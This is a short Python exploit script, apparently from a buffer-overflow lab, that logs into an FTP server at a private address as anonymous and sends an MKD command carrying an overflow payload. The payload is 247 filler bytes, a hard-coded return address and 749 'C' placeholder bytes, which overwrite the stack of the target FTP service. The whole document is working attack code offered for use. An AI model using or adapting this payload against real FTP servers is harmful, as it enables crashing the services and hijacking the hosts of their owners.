#!/usr/bin/python
 
import socket
import sys


payload = "A"*247 + "\x53\x93\x42\x7E"  + "C"*749


s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.136.144',21))
 

s.recv(1024)

s.send('USER anonymous\r\n')


s.recv(1024)

s.send('PASS anonymous\r\n')

s.recv(1024)


s.send('MKD ' + payload + '\r\n')

s.recv(1024)
s.send('QUIT\r\n')
s.close
